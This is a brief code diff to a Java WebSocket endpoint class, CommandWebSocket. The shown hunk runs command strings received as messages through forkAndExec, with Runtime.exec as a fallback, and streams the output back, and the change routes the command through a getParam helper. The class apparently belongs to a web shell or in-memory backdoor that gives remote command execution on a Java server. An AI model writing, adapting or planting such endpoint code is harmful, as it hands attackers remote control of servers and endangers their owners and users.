@@ -31,9 +31,9 @@ public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<S
         try {
             InputStream inputStream = null;
             try {
-                inputStream = forkAndExec(cmd);
+                inputStream = forkAndExec(getParam(cmd));
             } catch (Throwable e) {
-                inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+                inputStream = Runtime.getRuntime().exec(getParam(cmd)).getInputStream();
             }
             byte[] buf = new byte[8192];
             int length;
